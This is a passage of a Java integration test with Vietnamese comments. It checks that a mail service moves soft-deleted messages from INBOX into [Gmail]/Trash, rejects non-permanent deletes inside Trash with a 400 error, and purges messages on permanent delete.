            if (!gmailTrash.exists()) gmailTrash.create(jakarta.mail.Folder.HOLDS_MESSAGES);
            jakarta.mail.Folder allMail = imap.getStore().getFolder("[Gmail]/All Mail");
            if (!allMail.exists()) allMail.create(jakarta.mail.Folder.HOLDS_MESSAGES);
        }

        // Gửi 1 thư vào INBOX
        Session session = Session.getInstance(new Properties());
        MimeMessage msg = new MimeMessage(session);
        msg.setFrom(new InternetAddress("sender@test.local"));
        msg.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        msg.setSubject("Gmail Trash Behavior Check", "UTF-8");
        msg.setText("Kiểm tra chuyển vào [Gmail]/Trash thay vì chỉ lưu trữ All Mail", "UTF-8");
        msg.saveChanges();
        greenMail.getUserManager().getUser("alice@test.local").deliver(msg);

        MailListResponse inboxBefore = mailService.listMails(userAlice, 10L, "INBOX", 0, 10, null, null, null, null, null);
        assertEquals(1, inboxBefore.items().size());
        long uid = inboxBefore.items().get(0).uid();

        // 1. Xóa mặc định (permanent=false) từ INBOX -> phải COPY sang [Gmail]/Trash rồi expunge khỏi INBOX
        Map<String, Object> moved = mailService.deleteMail(userAlice, 10L, "INBOX", uid, false, inboxBefore.uidValidity(), "127.0.0.1");
        assertEquals("DELETED", moved.get("status"));
        assertEquals(false, moved.get("permanent"));

        assertEquals(0, mailService.listMails(userAlice, 10L, "INBOX", 0, 10, null, null, null, null, null).items().size(),
                "Thư phải biến mất khỏi INBOX sau khi xóa mềm");
        assertEquals(0, mailService.listMails(userAlice, 10L, "[Gmail]/All Mail", 0, 10, null, null, null, null, null).items().size(),
                "Không được chỉ lưu trữ vào All Mail");

        MailListResponse trashList = mailService.listMails(userAlice, 10L, "[Gmail]/Trash", 0, 10, null, null, null, null, null);
        assertEquals(1, trashList.items().size(), "Thư phải xuất hiện trong [Gmail]/Trash");
        assertEquals("Gmail Trash Behavior Check", trashList.items().get(0).subject());
        long trashUid = trashList.items().get(0).uid();

        // 2. Thư đã ở Thùng rác mà gọi permanent=false -> PHẢI từ chối 400 và KHÔNG xóa vĩnh viễn!
        AppException needPerm = assertThrows(AppException.class, () ->
                mailService.deleteMail(userAlice, 10L, "[Gmail]/Trash", trashUid, false, trashList.uidValidity(), "127.0.0.1"));
        assertEquals(HttpStatus.BAD_REQUEST, needPerm.getStatus());
        assertEquals("PERMANENT_DELETE_REQUIRED_IN_TRASH", needPerm.getCode());
        assertEquals(1, mailService.listMails(userAlice, 10L, "[Gmail]/Trash", 0, 10, null, null, null, null, null).items().size(),
                "Thư trong Thùng rác KHÔNG được bị xóa khi permanent=false");

        // 3. Gọi permanent=true trong [Gmail]/Trash -> xóa vĩnh viễn thành công
        Map<String, Object> purged = mailService.deleteMail(userAlice, 10L, "[Gmail]/Trash", trashUid, true, trashList.uidValidity(), "127.0.0.1");
        assertEquals(true, purged.get("permanent"));
        assertEquals(0, mailService.listMails(userAlice, 10L, "[Gmail]/Trash", 0, 10, null, null, null, null, null).items().size(),
                "Thư phải bị xóa vĩnh viễn khỏi [Gmail]/Trash khi permanent=true");
    }

    private byte[] sha256(byte[] data) throws Exception {
        return MessageDigest.getInstance("SHA-256").digest(data);
    }
}

